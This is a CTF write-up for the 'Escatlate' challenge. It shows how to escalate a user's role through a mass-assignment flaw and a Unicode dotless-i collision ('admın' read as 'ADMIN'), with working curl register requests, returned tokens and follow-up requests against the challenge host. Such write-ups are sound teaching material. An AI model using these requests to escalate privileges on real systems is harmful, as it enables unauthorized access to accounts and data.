# Escatlate
### There are two flags to find in this challenge. Let's take a look at how to find them.
[https://escatlate-52bc47e034fa.1753ctf.com/]
>
>Look! Kitties!
>
## Moderator

Logging in to the cat site automatically gets the `user role`, it allows you to browse the cat site and post comments. However, the application has a vulnerability: Mass Assignment. This means that the role assignment is not checked and the user can change it.That is, by providing a session token we are able to overwrite our role. Read more [here](https://tcm-sec.com/exploiting-mass-assignment-vulnerabilities/)

### example solution

```bash 
curl --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.catthesecond' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"test\",\"role\":\"MODERATOR\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
```
Then we recive: 
```bash
{"username":"fw","password":"test","token":"336acba143e311f0371d56a04f1698aad191017df4162b0a32f78aadb5298ccd","role":"MODERATOR"}
```
With changed role and our token we can write:

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Mr.FireFox' -H $'X-Token: 336acba143e311f0371d56a04f1698aad191017df4162b0a32f78aadb5298ccd' \           
    $'https://escatlate-52bc47e034fa.1753ctf.com/api/message'
```

## Admin

However, with the second flag, i.e. changing the role from `user` to `admin`, the application has a dotless vulnerability. When you specify a new role as `admın`, Unicode case collisions happen and it is read as `ADMIN`. More information [here](https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n)

### example solution
```bash 

url --path-as-is -i -s -k -X $'POST' -H '$HOST: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.cat' -H'Content-Type: application/json' -H $'Content-Lenght: 53' --data-binary $'{\"username\":\"fw\",\"password\":\"sus\",\"role\":\"admın\"}' $'https://escatlate-52bc47e034fa.1753ctf.com/api/register'
```
Then we also recive:
```bash
{"username":"fw","password":"sus","token":"2b0b185cdbd08004698673d68697f262f2511ad8c446a98e2c058759aa4478e2","role":"admın"}
```
so we can confirm our role now is `admın` but app read this role as  `ADMIN` so we have admin righ. Now we can use our rights and token to get flag:
```bash
curl --path-as-is -i -s -k -X $'GET' \
-H $'Host: escatlate-52bc47e034fa.1753ctf.com' -H $'User-Agent: Im.cat' -H $'X-Token: 2b0b185cdbd08004698673d68697f262f2511ad8c446a98e2c058759aa4478e2' \
$'https://escatlate-52bc47e034fa.1753ctf.com/api/message'

```
